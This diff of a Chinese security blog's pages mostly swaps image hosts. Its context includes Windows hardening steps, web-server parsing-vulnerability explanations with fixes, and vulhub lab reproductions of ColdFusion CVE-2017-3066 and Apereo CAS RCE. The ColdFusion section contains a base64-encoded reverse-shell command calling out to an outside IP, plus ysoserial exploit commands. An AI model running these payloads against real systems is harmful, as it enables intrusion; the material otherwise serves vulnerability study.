 <p>在一个完整的信息系统里面，日志系统是一个非常重要的功能组成部分。<br>它可以记录下系统所产生的所有行为，并按照某种规范表达出来。我们可以<br>使用日志系统所记录的信息为系统进行排错，优化系统的性能，或者根据这<br>些信息调整系统的行为。在安全领域，日志系统的重要地位尤甚，可以说是<br>安全审计方面最主要的工具之一。</p>
 </blockquote>
@@ -566,7 +566,7 @@
 <blockquote>
 <p>目的：禁止发送未加密的密码到第三方SMB服务器</p>
 </blockquote>
-<p>  <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101410.png" alt="image"></p>
+<p>  <img src="https://qiniu.hzktester.top/tp2020101410.png" alt="image"></p>
 <h3 id="恢复控制台"><a href="#恢复控制台" class="headerlink" title="恢复控制台"></a>恢复控制台</h3></li>
 <li><p>恢复控制台:允许软盘复制并访问所有驱动器和所有文件夹（禁用）</p>
 <blockquote>
@@ -577,7 +577,7 @@
 <blockquote>
 <p>目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统</p>
 </blockquote>
-<p>  <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101411.png" alt="image"></p>
+<p>  <img src="https://qiniu.hzktester.top/tp2020101411.png" alt="image"></p>
 <h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3></li>
 <li><p>关机：清除虚拟内存页面文件（启用）</p>
 <blockquote>
@@ -588,7 +588,7 @@
 <blockquote>
 <p>目的：防止连接远程桌面后恶意关机计算机</p>
 </blockquote>
-<p>  <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101412.png" alt="image"></p>
+<p>  <img src="https://qiniu.hzktester.top/tp2020101412.png" alt="image"></p>
 <h3 id="交互式登录"><a href="#交互式登录" class="headerlink" title="交互式登录"></a>交互式登录</h3></li>
 <li><p>交互式登录：登陆时不显示用户名（启用）</p>
 <blockquote>
@@ -604,12 +604,12 @@
 <blockquote>
 <p>目的：登陆时不显示上次的用户名，防止暴露用户名</p>
 </blockquote>
-<p>  <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101413.png" alt="image"></p>
+<p>  <img src="https://qiniu.hzktester.top/tp2020101413.png" alt="image"></p>
 <h3 id="审核"><a href="#审核" class="headerlink" title="审核"></a>审核</h3></li>
 <li><p>审核：如果无法记录安全审核则立即关闭系统</p>
 </li>
 <li><p>审核：对全局系统对象的访问进行审核（启用）</p>
-<p>  <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101414.png" alt="image"></p>
+<p>  <img src="https://qiniu.hzktester.top/tp2020101414.png" alt="image"></p>
 <h3 id="网络访问"><a href="#网络访问" class="headerlink" title="网络访问"></a>网络访问</h3></li>
 <li><p>网络访问：不允许SAM帐户和共享的匿名枚举（启用）</p>
 <blockquote>
@@ -627,7 +627,7 @@
 <li><p>网络访问：可远程访问的注册表路径（全部删除）</p>
 </li>
 <li><p>网络访问：可远程访问的注册表路径和子路径 （全部删除）</p>
-<p>  <img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101415.png" alt="image"></p>
+<p>  <img src="https://qiniu.hzktester.top/tp2020101415.png" alt="image"></p>
 </li>
 </ul>
 <h2 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h2><p>文件系统又被称作文件管理系统，它是指操作系统中负责管理和存储文件信息的软件机构。文件系统由与文件管理有关的软件、被管理的文件以及实施文件管理所需的数据结构这三部分构成。</p>
@@ -676,7 +676,7 @@
 <td></td>
 </tr>
 </tbody></table>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101416.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101416.png" alt="image"></p>
 <h2 id="注册表安全设置"><a href="#注册表安全设置" class="headerlink" title="注册表安全设置"></a>注册表安全设置</h2><p>通过注册表，用户可以轻易地添加、删除、修改windows系统内的软件<br>配置信息或硬件驱动程序，这不仅方便了用户对系统软硬件的工作状态进行<br>适时的调整，于此同时注册表也是入侵者攻击的目标，通过注册表也可称为入侵者攻击的目标，通过注册表种植木马、修改软件信息，甚至删除、停用<br>或改变硬件的工作状态。</p>
 <table>
 <thead>
@@ -707,33 +707,33 @@
 </tr>
 </tbody></table>
 <h3 id="注册表权限"><a href="#注册表权限" class="headerlink" title="注册表权限"></a>注册表权限</h3><p>利用文件管理器对<code>regedit.exe</code>文件设置成只允许管理员能使用命令访问修改注册表，其他用户只能读取，但不是修改这样就可以防止非法用户恶意修改注册表。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101417.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101417.png" alt="image"></p>
 <h3 id="禁止空链接"><a href="#禁止空链接" class="headerlink" title="禁止空链接"></a>禁止空链接</h3><p>禁用IPC连接，编辑注册表</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous值为1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101418.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101418.png" alt="image"></p>
 <h3 id="删除系统默认共享"><a href="#删除系统默认共享" class="headerlink" title="删除系统默认共享"></a>删除系统默认共享</h3><p>删除服务器上的管理员共享</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer设置为0</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101419.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101419.png" alt="image"></p>
 <p>使用<code>net share</code>命令查看默认共享</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101420.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101420.png" alt="image"></p>
 <p>使用<code>net share &lt;共享名&gt; /del</code>删除默认共享（管理员身份运行）</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101421.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101421.png" alt="image"></p>
 <h3 id="修改默认3389远程端口"><a href="#修改默认3389远程端口" class="headerlink" title="修改默认3389远程端口"></a>修改默认3389远程端口</h3><p>修改注册表</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101422.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101422.png" alt="image"></p>
 <h2 id="关闭135-139-445隐患端口"><a href="#关闭135-139-445隐患端口" class="headerlink" title="关闭135 139 445隐患端口"></a>关闭135 139 445隐患端口</h2><h3 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h3><p>”开始“–“运行”，输入”dcomcnfg”，单击“确定”，打开组件服务</p>
 <p>右键我的电脑，单击”属性”，在默认属性中 <strong>去掉 在此计算机上启用分布式COM</strong> 前打勾<br>选择”默认协议”选项卡，<strong>移除“面向连接的TCP/IP”</strong>，单击”确定”按钮，设置完成，重新启动后即可关闭135端口</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101423.png" alt="image"></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101424.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101423.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101424.png" alt="image"></p>
 <h3 id="关闭139端口"><a href="#关闭139端口" class="headerlink" title="关闭139端口"></a>关闭139端口</h3><p>右键我的”网上邻居“，单击”属性“，再打开本地连接的”属性</p>
 <p>选中Internet协议(TCP/IP),常规选项卡-高级</p>
 <p>设置WINS选项卡”禁用TCP/IP上的NETBIOS”</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101425.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101425.png" alt="image"></p>
 <h3 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h3><p>修改注册表，添加一个键值</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters在右面的窗口</span><br><span class="line">新建一个SMBDeviceEnabled 为REG_DWORD类型键值为 0。</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101426.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101426.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>安全加固</category>
@@ -751,37 +751,37 @@
 </blockquote>
 <h2 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p>该版本默认会将<code>*.asp;.jpg</code>此种格式的文件名，当成<code>Asp</code>解析，原理是 服务器默认不解析<code>;</code>号及其后面的内容，相当于截断。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101201.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101201.png" alt="image"></p>
 <h3 id="文件夹名解析漏洞"><a href="#文件夹名解析漏洞" class="headerlink" title="文件夹名解析漏洞"></a>文件夹名解析漏洞</h3><p>该版本默认会将<code>*.asp/</code>目录下的所有文件当成<code>Asp</code>解析。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.asp&#x2F;xxx.jpg</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101202.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101202.png" alt="image"></p>
 <p>另外，<code>IIS6.x</code>除了会将扩展名为<code>.asp</code>的文件解析为<code>asp</code>之外，还默认会将扩展名为<code>.asa</code>，<code>.cdx</code>，<code>.cer</code>解析为<code>asp</code></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101203.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101203.png" alt="image"></p>
 <h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>由于微软并不认为这是一个漏洞，也没有推出<code>IIS 6.0</code>的补丁，因此漏洞需要自己修复。</p>
 <ol>
 <li>限制上传目录执行权限，不允许执行脚本。</li>
 </ol>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101204.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101204.png" alt="image"></p>
 <ol start="2">
 <li>不允许新建目录。</li>
 <li>上传的文件需经过重命名(时间戳+随机数+.jpg等)</li>
 </ol>
 <h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="IIS-7-x解析漏洞"><a href="#IIS-7-x解析漏洞" class="headerlink" title="IIS 7.x解析漏洞"></a>IIS 7.x解析漏洞</h3><p><code>IIS7.x</code>版本在<code>Fast-CGI</code>运行模式下,在任意文件，例：<code>test.jpg</code>后面加上<code>/.php</code>，会将<code>test.jpg</code>解析为<code>php</code>文件。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.jpg&#x2F;.php</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101205.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101205.png" alt="image"></p>
 <h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101206.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101206.png" alt="image"></p>
 <p>结果如下：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101207.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101207.png" alt="image"></p>
 <h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p><code>Apache</code>是世界使用排名第一的<code>Web</code>服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的<code>API</code>扩充，将<code>Perl/Python</code>等解释器编译到服务器中。</p>
 <h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p><code>Apache</code>的解析漏洞依赖于一个特性： <strong>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析。</strong></p>
 <p>访问<code>phpinfo.php.xxx</code></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101208.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101208.png" alt="image"></p>
 <p>实战中可以上传<code>rar</code>，<code>owf</code>等文件进行利用，如果上传<code>phpinfo.php.jpg</code>，即使文件名中有<code>.php</code>，也会直接解析为<code>jpg</code>。因为<code>Apache</code>认识<code>.jpg</code>,停止继续向左识别。</p>
 <h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>如果运维人员给<code>.php</code>后缀增加了处理器：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>
 <p>那么，在有多个后缀的情况下，只要一个文件名中含有<code>.php</code>后缀，即被识别成<code>PHP</code>文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101209.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101209.png" alt="image"></p>
 <p>即使最右边的文件格式是在<code>mime.types</code>文件内，只要文件名中出现<code>.php</code>，就直接被解析为<code>php</code>。</p>
 <h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>影响范围：2.4.0~2.4.29版本</p>
 <p>环境：phpstudy2014 Apache + PHP5.4n</p>
@@ -790,15 +790,15 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
 <p>测试代码：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">    $name &#x3D; basename($_POST[&#39;name&#39;]);</span><br><span class="line">    $ext &#x3D; pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) &#123;</span><br><span class="line">        exit(&#39;bad file&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;.&#x2F;&#39; . $name);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101210.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101210.png" alt="image"></p>
 <p>点击Go后，效果如下:</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101211.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101211.png" alt="image"></p>
 <p>相同代码在Linux下进行测试，可以正常写入。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101212.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101212.png" alt="image"></p>
 <p>访问：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101213.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101213.png" alt="image"></p>
 <p>限制：获取文件名时不能用<code>$_FILES[‘file’][‘name’]</code>，因为它会自动把换行去掉。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101214.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101214.png" alt="image"></p>
 <h2 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
 <li>升级到最新版本</li>
 <li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</li>
@@ -806,16 +806,16 @@
 <h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>Nginx</code>是一款轻量级的<code>Web</code> 服务器/反向代理服务器及电子邮件<code>（IMAP/POP3）</code>代理服务器，在<code>BSD-like</code> 协议下发行。其特点是占有内存少，并发能力强，事实上<code>nginx</code>的并发能力确实在同类型的网页服务器中表现较好</p>
 <h2 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h2><p>对于任意文件名，在后面添加<code>/xxx.php</code>（xxx为任意字符）后,即可将文件作为<code>php</code>解析。</p>
 <p>例：<code>info.jpg</code>后面加上<code>/xxx.php</code>，会将<code>info.jpg</code> 以<code>php</code>解析。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101215.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101215.png" alt="image"></p>
 <p>该漏洞是<code>Nginx</code>配置所导致，与<code>Nginx</code>版本无关，下面是常见的漏洞配置。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           &#x2F;work&#x2F;www&#x2F;test;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    </span><br><span class="line">	$document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:&#x2F;tmp&#x2F;php-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>当攻击者访问<code>/info.jpg/xxx.php</code>时， <code>Nginx</code>将查看<code>URL</code>，看到它以<code>.php</code>结尾，并将路径传递给<code>PHP fastcgi</code>处理程序。</p>
 <p><code>Nginx</code>传给<code>php</code>的路径为<code>c:/WWW/info.jpg/xxx.php</code>,<br>在<code>phpinfo</code>中可以查看<code>_SERVER[&quot;ORIG_SCRIPT_FILENAME&quot;]</code>得到。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101216.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101216.png" alt="image"></p>
 <h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101206.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101206.png" alt="image"></p>
 <p>结果如下：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101207.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101207.png" alt="image"></p>
 <p>如果需要使用到<code>cgi.fix_pathinfo</code>这个特性（例如：<code>Wordpress</code>），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p>
 <p>或高版本<code>PHP</code>提供了<code>security.limit_extensions</code>这个配置参数，设置<code>security.limit_extensions = .php</code></p>
 <hr>
@@ -836,27 +836,27 @@
 <h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>启动漏洞环境</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>等待数分钟时间，环境启动成功，访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装<code>Adobe ColdFusion</code></p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101013.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101013.png" alt="image"></p>
 <p>安装成功后页面如下：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101014.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101014.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p>
 <p>同时获取最新版的<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a>。放在同一目录下</p>
 <p>生成POC（执行命令<code>touch /tmp/success</code>）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101015.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101015.png" alt="image"></p>
 <p>POC生成于<code>poc.ser</code>文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，<code>Content-Type</code>为<code>application/x-amf</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;flex2gateway&#x2F;amf HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101016.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101016.png" alt="image"></p>
 <p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101017.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101017.png" alt="image"></p>
 <p>接下来试一下反弹<code>shell</code>（生成一个反弹shell的poc）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; shell.ser</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101018.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101018.png" alt="image"></p>
 <p>使用<code>curl</code>命令提交poc：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8500&#x2F;flex2gateway&#x2F;amf --data-binary @shell.ser</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101019.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101019.png" alt="image"></p>
 <p>成功反弹shell：</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101020.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101020.png" alt="image"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
@@ -872,17 +872,17 @@
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>vulhub</code>启动漏洞环境</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 <p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101009.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101009.png" alt="image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞原理是<code>Webflow</code>中使用了默认密钥<code>changeit</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure>
 <p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用<code>ysoserial</code>的<code>CommonsCollections4</code>生成加密后的<code>Payload</code>：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="http://qhxid5jsx.hn-bkt.clouddn.com/tp2020101010.png" alt="image"></p>
+<p><img src="https://qiniu.hzktester.top/tp2020101010.png" alt="image"></p>
 <p>然后登录<code>CAS</code>并抓包，将<code>Body</code>中的<code>execution</code>值替换成上面生成的<code>Payload</code>发送：</p>
